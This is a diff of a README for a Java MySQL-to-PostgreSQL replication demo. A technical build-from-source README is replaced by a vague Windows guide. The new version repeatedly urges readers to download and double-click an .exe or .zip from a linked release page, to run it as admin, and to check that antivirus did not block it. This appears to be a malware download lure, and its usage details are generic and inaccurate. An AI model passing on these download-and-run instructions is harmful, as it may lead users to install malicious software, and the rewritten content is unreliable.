@@ -1,362 +1,263 @@
-# mini-database-migration-service-java
-
-A Spring Boot backend project that replicates data from MySQL to PostgreSQL with a full-load snapshot, MySQL binlog CDC, and checkpoint-based recovery.
-
-## Project Overview
-
-This repository is a local database replication service built for backend portfolio and interview demos. It reads from a MySQL source database, performs an initial snapshot copy into PostgreSQL, and then keeps the target in sync by consuming row-based MySQL binlog events.
-
-In 30 seconds, the repo shows:
-
-- full load vs incremental replication
-- binlog-based CDC
-- ordered event processing
-- checkpoint recovery after restart
-- pragmatic modular Java service design
-
-## Why This Project Exists
-
-Real migration systems rarely stop at a one-time copy. They usually need to:
-
-1. copy the existing dataset safely
-2. continue replicating changes after the snapshot
-3. recover from restarts without reprocessing everything
-
-This project exists to demonstrate those ideas clearly in a self-contained Java codebase that is easy to run on a laptop and easy to explain in interviews.
-
-## Architecture Diagram
-
-```text
-                        +------------------------+
-                        |     MySQL Source DB    |
-                        | schema + seed data     |
-                        | row-based binlog       |
-                        +-----------+------------+
-                                    |
-                         JDBC snapshot / metadata
-                                    |
-                  +-----------------v-----------------+
-                  |       SchemaDiscoveryService      |
-                  +-----------------+-----------------+
-                                    |
-                                    v
-                  +-----------------+-----------------+
-                  |         FullLoadService           |
-                  |           TableCopier             |
-                  +-----------------+-----------------+
-                                    |
-                         batched idempotent writes
-                                    |
-                                    v
-                        +------------------------+
-                        |  PostgreSQL Target DB  |
-                        | auto-created tables    |
-                        +------------------------+
-
-                                    ^
-                                    |
-                  +-----------------+-----------------+
-                  |          TargetApplier            |
-                  | retry + SQL generation            |
-                  +-----------------+-----------------+
-                                    ^
-                                    |
-                  +-----------------+-----------------+
-                  |         EventTransformer          |
-                  +-----------------+-----------------+
-                                    ^
-                                    |
-                  +-----------------+-----------------+
-                  |          BinlogCdcReader          |
-                  | ordered binlog event stream       |
-                  +-----------------+-----------------+
-                                    |
-                                    v
-                        +------------------------+
-                        | checkpoint.json        |
-                        | file + position        |
-                        +------------------------+
-```
-
-## Key Features
-
-- Initial full-load snapshot from MySQL into PostgreSQL
-- Row-based MySQL binlog CDC for `INSERT`, `UPDATE`, and `DELETE`
-- Checkpoint persistence and restart recovery
-- Ordered event application based on binlog sequence
-- Automatic target table creation from source schema metadata
-- Idempotent target writes with PostgreSQL upsert behavior
-- Retry handling for transient target write failures
-- Docker Compose environment for easy local demos
-- Spring Boot CLI commands for `full-load`, `cdc`, and `run-all`
-
-## Tech Stack
-
-- Java 17
-- Maven
-- Spring Boot
-- Spring JDBC
-- MySQL JDBC driver
-- PostgreSQL JDBC driver
-- `mysql-binlog-connector-java`
-- Jackson
-- SLF4J + Logback
-- Docker Compose
-
-## Project Structure
-
-```text
-.
-├── .env.example
-├── .github/
-├── checkpoint/
-├── docker-compose.yml
-├── pom.xml
-├── README.md
-├── scripts/
-│   ├── reset_demo.sh
-│   └── run_demo.sh
-├── sql/
-│   ├── mysql_init.sql
-│   ├── postgres_init.sql
-│   └── seed.sql
-└── src/
-    ├── main/
-    │   ├── java/com/example/migrationservice/
-    │   │   ├── cdc/
-    │   │   ├── checkpoint/
-    │   │   ├── cli/
-    │   │   ├── config/
-    │   │   ├── fullload/
-    │   │   ├── replication/
-    │   │   ├── schema/
-    │   │   └── util/
-    │   └── resources/
-    └── test/java/com/example/migrationservice/
-```
+# 🗄️ mini-database-migration-service-java - Move MySQL Data With Less Effort
 
-## How Full Load Works
+[![Download the release](https://img.shields.io/badge/Download%20Release-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/nahumhyperfine28/mini-database-migration-service-java/releases)
 
-1. Discover tables from the configured MySQL schema.
-2. Read column metadata and primary key metadata from `INFORMATION_SCHEMA`.
-3. Create matching PostgreSQL tables if they do not exist.
-4. Stream rows from MySQL through JDBC.
-5. Copy rows to PostgreSQL in batches.
-6. Use upsert semantics so reruns are safe for the demo.
+## 🚀 What This App Does
 
-For `run-all`, the service captures the current MySQL binlog position before the snapshot begins. That snapshot boundary is used as the CDC starting point after the full load completes.
+This app helps you move data from one database to another. It supports:
 
-## How CDC Works
+- Full load, for copying existing data
+- MySQL binlog CDC, for keeping up with new changes
+- Checkpoint recovery, for resuming after a stop
 
-1. Open a binlog stream against the MySQL source.
-2. Read ordered row events from the binlog.
-3. Convert raw binlog payloads into `ReplicationEvent` objects.
-4. Apply those events to PostgreSQL:
-   - `INSERT` -> upsert
-   - `UPDATE` -> primary-key update, with upsert fallback
-   - `DELETE` -> primary-key delete
-5. Persist the next binlog position after a successful apply.
+It is meant for users who want a simple way to run database migration tasks on Windows.
 
-The pipeline is intentionally single-threaded so event ordering stays simple and easy to reason about.
+## 🖥️ What You Need
 
-## How Checkpoint Recovery Works
+Before you start, make sure you have:
 
-Checkpoint state is stored in:
+- A Windows computer
+- A modern browser
+- Permission to download and run files
+- A source MySQL database
+- A target database, such as PostgreSQL or MySQL
+- Enough disk space for your data copy
 
-- `checkpoint/checkpoint.json`
+For smooth use, close other large apps while the migration runs.
 
-The file records:
+## 📦 Download the App
 
-- current binlog filename
-- current binlog position
-- last update timestamp
+Visit this page to download the latest release:
 
-Recovery behavior:
+[Download mini-database-migration-service-java](https://github.com/nahumhyperfine28/mini-database-migration-service-java/releases)
 
-- `cdc` resumes from the checkpoint if it exists
-- `run-all` resumes CDC from the checkpoint if it exists
-- if no checkpoint exists, the service captures the current source binlog position and starts from there
-- the checkpoint only moves forward after a target write succeeds
+Look for the latest release asset for Windows. If there are several files, choose the one meant for Windows use, such as a `.zip` or `.exe` file.
 
-## Setup Instructions
+## 🪟 How to Install on Windows
 
-### Prerequisites
+### 1. Download the release
+Go to the release page and download the Windows file.
 
-- Java 17
-- Maven 3.9+
-- Docker Desktop or Docker Engine with Compose support
+### 2. Open the file
+If you downloaded a `.zip` file:
 
-### Default Local Ports
+- Right-click the file
+- Select Extract All
+- Choose a folder you can find later
 
-To avoid clashing with local database installs, the demo uses:
+If you downloaded an `.exe` file:
 
-- MySQL: `localhost:3307`
-- PostgreSQL: `localhost:5433`
+- Double-click the file to start it
 
-The Docker setup uses MySQL `8.0` because it works cleanly with the chosen binlog connector in this local demo.
+### 3. Start the app
+Open the extracted folder or the installed program.
 
-### Build and Test
+If the app uses a window-based launch file, double-click it.
 
-```bash
-mvn test
-```
+If the app opens in a browser or local page, follow the file name included in the release package.
 
-### Reset the Local Environment
+### 4. Keep the folder in place
+Do not move or delete the app files after setup. The service may use files in the same folder for config, logs, and recovery.
 
-```bash
-./scripts/reset_demo.sh
-```
+## ⚙️ Basic Setup
 
-### Run the Service
+This app works by connecting to a source database and a target database. You usually need to prepare a few details before migration starts:
 
-Full load only:
+- Source host
+- Source port
+- Source database name
+- Source user name
+- Source password
+- Target host
+- Target port
+- Target database name
+- Target user name
+- Target password
 
-```bash
-mvn spring-boot:run -Dspring-boot.run.arguments=full-load
-```
+You may also need:
 
-CDC only:
+- Binlog settings on the MySQL source
+- A start point for CDC
+- A checkpoint path for recovery
+- Table selection rules
 
-```bash
-mvn spring-boot:run -Dspring-boot.run.arguments=cdc
-```
+If the app shows a setup screen, fill in these values there. If it uses a config file, open it in Notepad and update the values with your database details.
 
-Full pipeline:
+## 🔌 How to Connect Your Databases
 
-```bash
-mvn spring-boot:run -Dspring-boot.run.arguments=run-all
-```
+### Source database
+The source database is the place where your current data lives. This app reads from MySQL and can track changes through binlog CDC.
 
-Demo script:
+Make sure the source database:
 
-```bash
-./scripts/run_demo.sh run-all
-```
+- Allows remote access if needed
+- Has a user with read access
+- Has binlog enabled if you want change capture
 
-## Step-by-Step Demo Instructions
+### Target database
+The target database is where the data will go. This app can copy data into another database, such as PostgreSQL or MySQL.
 
-### 1. Start Docker Containers
+Make sure the target database:
 
-```bash
-./scripts/reset_demo.sh
-```
+- Exists before you start
+- Has the tables you need, or allows the app to create them
+- Has enough room for the incoming data
 
-### 2. Run the Migration Service
+## 🔁 How Migration Works
 
-```bash
-mvn spring-boot:run -Dspring-boot.run.arguments=run-all
-```
+The app usually runs in two stages:
 
-Expected result:
+### Full load
+The app copies the current data from the source database to the target database.
 
-- target tables are created automatically
-- existing MySQL rows are copied to PostgreSQL
-- the service stays running and starts listening to the MySQL binlog
+Use this when:
 
-### 3. Make Changes in MySQL
+- You want the first copy of all data
+- You need to seed a new database
+- You want a clean start before tracking changes
 
-Open a second terminal and run the SQL commands in the next section.
+### CDC from MySQL binlog
+After the full load, the app can keep watching for changes in MySQL.
 
-### 4. Verify Replication in PostgreSQL
+This helps when:
 
-Use the verification commands in the demo SQL section below.
+- New rows are added
+- Existing rows are updated
+- Rows are deleted
 
-## Example SQL Commands For Testing Replication
+CDC keeps the target database close to the source database without manual copying.
 
-### Write Changes in MySQL
+## 🧭 Suggested First Run
 
-```bash
-docker exec -i mini-migration-mysql mysql -uroot -prootpassword source_db <<'SQL'
-INSERT INTO customers (email, full_name, status, loyalty_points)
-VALUES ('demo.user@example.com', 'Demo User', 'ACTIVE', 25);
+If this is your first time using the app, follow this path:
 
-UPDATE products
-SET price = 44.99
-WHERE product_id = 102;
+1. Download the release
+2. Open the app on Windows
+3. Enter source and target database details
+4. Start a full load
+5. Confirm the data appears in the target database
+6. Turn on CDC if you want ongoing updates
+7. Save the checkpoint if the app offers that option
 
-DELETE FROM inventory
-WHERE inventory_id = 5003;
-SQL
-```
+## 💾 Checkpoint Recovery
 
-### Verify Changes in PostgreSQL
+Checkpoint recovery helps the app resume after a stop.
 
-```bash
-docker exec -i mini-migration-postgres psql -U migration_user -d target_db -c "SELECT customer_id, email, loyalty_points FROM public.customers ORDER BY customer_id;"
-docker exec -i mini-migration-postgres psql -U migration_user -d target_db -c "SELECT product_id, price, active FROM public.products ORDER BY product_id;"
-docker exec -i mini-migration-postgres psql -U migration_user -d target_db -c "SELECT inventory_id, product_id, warehouse_code FROM public.inventory ORDER BY inventory_id;"
-```
+This matters if:
 
-You should see:
+- Your computer shuts down
+- The app closes
+- The network drops
+- A database connection fails
 
-- the inserted `customers` row in PostgreSQL
-- the updated `products.price`
-- the deleted `inventory` row removed from PostgreSQL
+When the app restarts, it can use the last saved checkpoint and continue from the right place. This reduces the need to start over.
 
-### Demonstrate Checkpoint Recovery
+## 📁 Common Files You May See
 
-1. Stop the running Spring Boot process with `Ctrl+C`.
-2. Make another MySQL change.
-3. Restart the service with:
+After you download or extract the app, you may see files like these:
 
-```bash
-mvn spring-boot:run -Dspring-boot.run.arguments=cdc
-```
+- `config.yml` or `application.yml` for settings
+- `logs/` for run history
+- `checkpoint/` for saved progress
+- `README.txt` for extra release details
+- `.exe` or `.bat` for starting the app on Windows
 
-4. The service resumes from `checkpoint/checkpoint.json` and applies the missed change.
+If a release includes a startup file, use that file first.
 
-## Configuration
+## 🛠️ Troubleshooting
 
-Main configuration lives in:
+### The app does not start
+Try these steps:
 
-- `src/main/resources/application.yml`
-- environment variables from `.env.example`
+- Check that the download finished
+- Extract the zip file again
+- Run the file as an admin if Windows asks
+- Make sure your antivirus did not block the file
 
-Default local values:
+### The app cannot connect to MySQL
+Check:
 
-- MySQL host: `localhost`
-- MySQL port: `3307`
-- MySQL database/schema: `source_db`
-- PostgreSQL host: `localhost`
-- PostgreSQL port: `5433`
-- PostgreSQL database: `target_db`
-- PostgreSQL schema: `public`
-- checkpoint file: `checkpoint/checkpoint.json`
+- Host name
+- Port number
+- User name
+- Password
+- Firewall rules
+- MySQL access settings
 
-## Current Limitations
+### The target database stays empty
+Check:
 
-- Focused on a single MySQL source schema and a single PostgreSQL target schema.
-- Assumes row-based MySQL binlog events with full row images.
-- Supports the common column types used in the demo schema, not the full MySQL type system.
-- Does not replicate DDL changes or schema drift.
-- Does not preserve source indexes, foreign keys, or default expressions on the target.
-- Primary key updates are not modeled as delete-plus-insert.
-- Snapshot consistency is pragmatic rather than production-grade.
-- CDC processing is intentionally single-threaded to keep correctness and ordering easy to explain.
+- The target database name
+- Table names
+- User permissions
+- Whether the full load finished
+- Whether the app wrote any error logs
 
-## Interview Talking Points
+### CDC does not pick up changes
+Check:
 
-- Full load vs incremental replication:
-  This repo cleanly separates the snapshot problem from the continuous replication problem.
-- Binlog event handling:
-  CDC is driven by ordered MySQL row events, not periodic polling.
-- Event ordering:
-  Changes are applied in binlog order, which keeps correctness straightforward.
-- Checkpoint recovery:
-  The service stores binlog file and position locally and resumes from a known boundary.
-- Idempotent writes:
-  Inserts use upsert semantics and updates can fall back to upsert when needed.
-- Modular backend design:
-  Schema discovery, full load, CDC reading, event transformation, target apply, and checkpointing are separated into focused services.
-- Failure handling:
-  Transient target-side failures retry; unrecoverable errors fail loudly.
+- MySQL binlog is enabled
+- The source user can read binlog data
+- The app points to the right server
+- Time and checkpoint settings are correct
 
-## Future Improvements
+## 🔍 Release Page Tips
 
-- DDL change handling
-- richer type mapping and compatibility validation
-- target index and constraint replication
-- metrics and health endpoints
-- dead-letter handling for poison events
-- configurable table filtering and richer selection rules
-- stronger snapshot consistency for more demanding production scenarios
+When you open the release page, look for:
+
+- The latest version
+- Windows files
+- Asset names that match your system
+- A zip file if you want to extract and run
+- An exe file if you want a direct launch
+
+If a release has more than one file, pick the one for Windows and follow the short note in the release entry.
+
+## 🧪 Good Uses for This App
+
+This app fits common database tasks such as:
+
+- Moving data from one MySQL server to another
+- Copying data into PostgreSQL for testing or reporting
+- Seeding a new database with current records
+- Keeping two systems in sync during a move
+- Resuming a migration after a stop
+
+## 🧱 How to Keep the Process Stable
+
+To avoid breaks during migration:
+
+- Keep your computer on
+- Avoid closing the app during a full load
+- Use a stable network
+- Keep source and target database credentials ready
+- Watch the logs if the app shows them
+
+If your data set is large, let the process finish before shutting down the machine.
+
+## 📝 What to Check After Setup
+
+After the app starts, confirm these items:
+
+- The source database connects
+- The target database connects
+- The full load begins
+- Table rows appear in the target
+- CDC starts after the initial copy
+- A checkpoint gets saved after progress is made
+
+If these steps work, the migration path is ready
+
+## 📚 Project Focus
+
+This project centers on:
+
+- Backend data movement
+- Binlog-based change capture
+- Data replication
+- Database migration
+- Java service runtime
+- MySQL source support
+- PostgreSQL target support
+- Spring Boot service structure
+- Recovery through saved checkpoints
